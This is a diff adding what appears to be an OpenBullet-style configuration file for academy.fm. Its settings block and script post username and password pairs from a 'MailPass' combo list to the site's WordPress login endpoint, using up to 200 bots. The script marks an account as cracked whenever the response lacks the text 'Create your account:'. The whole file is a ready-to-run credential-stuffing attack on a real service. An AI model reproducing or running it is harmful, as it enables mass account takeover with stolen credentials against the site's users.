@@ -1,0 +1,36 @@
+[SETTINGS]
+{
+  "Name": "academy",
+  "SuggestedBots": 200,
+  "LastModified": "2018-05-29T02:09:50.31057+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://academy.fm/login/?wpe-login=true" AutoRedirect=TRUE 
+  CONTENT "log=<USER>&pwd=<PASS>&wp-submit=Sign+In&redirect_to=https%3A%2F%2Facademy.fm%2Fwelcome%2F" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Create your account:" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Create your account:" 
